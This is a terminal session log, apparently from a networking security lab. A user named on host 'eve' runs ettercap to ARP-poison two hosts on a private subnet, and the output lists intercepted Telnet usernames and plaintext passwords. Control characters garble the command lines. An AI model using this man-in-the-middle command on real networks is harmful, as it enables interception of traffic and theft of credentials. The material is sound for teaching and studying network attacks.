@@ -1,0 +1,66 @@
+Script started on Mon 02 Oct 2017 08:27:59 PM PDT
+jjc400bm@eve:~$ exitsudo ettercap -Tq -i eth0 -M arp:remote /10.1.1.2// /10.1.1.3//-[1@-[1@w[1@ [1@t[1@e[1@s[1P[1P[1P[1@a[1@r[1@p[1@P.-i eth0 -M arp:remote /10.1.1.2// /10.1.1.3// [Ajc400bm@eve:~$ sudo ettercap -Tq -w arpP.t-i eth0 -M arp:remote /10.1.1.2// /10.1.1.3
+/[Ajc400bm@eve:~$ sudo ettercap -Tq -w arpP.tx-i eth0 -M arp:remote /10.1.1.2// /10.1.1.3//[Ac400bm@eve:~$ sudo ettercap -Tq -w arpP.txt-i eth0 -M arp:remote /10.1.1.2// /10.1.1.3//[A400bm@eve:~$ sudo ettercap -Tq -w arpP.txt -i eth0 -M arp:remote /10.1.1.2// /10.1.1.[1@3[Ac400bm@eve:~$ sudo ettercap -Tq -w arpP.txt 
+
+
+[1mettercap 0.8.2[0m copyright 2001-2015 Ettercap Development Team
+
+Listening on:
+  eth0 -> 00:04:23:BB:22:48
+	  10.1.1.4/255.255.255.0
+	  fe80::204:23ff:febb:2248/64
+
+SSL dissection needs a valid 'redir_command_on' script in the etter.conf file
+Ettercap might not work correctly. /proc/sys/net/ipv6/conf/all/use_tempaddr is not set to 0.
+Privileges dropped to EUID 65534 EGID 65534...
+
+  33 plugins
+  42 protocol dissectors
+  57 ports monitored
+20388 mac vendor fingerprint
+1766 tcp OS fingerprint
+2182 known services
+Lua: no scripts were specified, not starting up!
+
+Scanning for merged targets (2 hosts)...
+
+/ |=========================>                         |  50.00 %- |==================================================>| 100.00 %* |==================================================>| 100.00 %
+
+2 hosts added to the hosts list...
+
+ARP poisoning victims:
+
+ GROUP 1 : 10.1.1.2 00:14:22:0E:9A:CD
+
+ GROUP 2 : 10.1.1.3 00:04:23:BF:66:45
+Starting Unified sniffing...
+
+
+Text only Interface activated...
+Hit 'h' for inline help
+
+TELNET : 10.1.1.2:23 -> USER: jambo  PASS: screen
+TELNET : 10.1.1.2:23 -> USER: jimbo  PASS: screen
+TELNET : 10.1.1.2:23 -> USER: jumbo  PASS: screen
+TELNET : 10.1.1.2:23 -> USER: jimbo  PASS: screen
+TELNET : 10.1.1.2:23 -> USER: jimbo  PASS: screen
+TELNET : 10.1.1.2:23 -> USER: jambo  PASS: screen
+TELNET : 10.1.1.2:23 -> USER: jambo  PASS: screen
+TELNET : 10.1.1.2:23 -> USER: jumbo  PASS: screen
+TELNET : 10.1.1.2:23 -> USER: jimbo  PASS: screen
+TELNET : 10.1.1.2:23 -> USER: jimbo  PASS: screen
+TELNET : 10.1.1.2:23 -> USER: jimbo  PASS: screen
+TELNET : 10.1.1.2:23 -> USER: jumbo  PASS: screen
+Closing text interface...
+
+
+Terminating ettercap...
+Lua cleanup complete!
+ARP poisoner deactivated.
+RE-ARPing the victims...
+Unified sniffing was stopped.
+
+jjc400bm@eve:~$ exit
+exit
+
+Script done on Mon 02 Oct 2017 08:29:08 PM PDT
